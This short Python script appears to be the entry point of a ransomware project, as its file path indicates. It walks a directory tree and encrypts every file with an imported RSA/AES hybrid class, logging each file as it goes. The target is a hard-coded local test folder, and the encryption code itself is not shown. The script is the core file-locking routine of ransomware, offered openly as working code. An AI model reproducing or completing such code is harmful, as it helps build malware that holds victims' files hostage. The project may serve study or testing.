#!/usr/bin/env python

import src.logger as logger
import src.encrypt as encrypt
import src.decrypt as decrypt
import os


def main(rootdir):
    rsa_aes = encrypt.RSAAESEncryption()
    for subdir, dirs, files in os.walk(rootdir):
        for file in files:
            fpath = os.path.abspath(os.path.join(subdir, file))
            rsa_aes.encrypt(fpath)
            logger.info(f"Encrypted file: {file}")


if __name__ == '__main__':
    main("/Users/dylz/Documents/ransomware/tests/to_encrypt/subfolder/subsubfolder/")
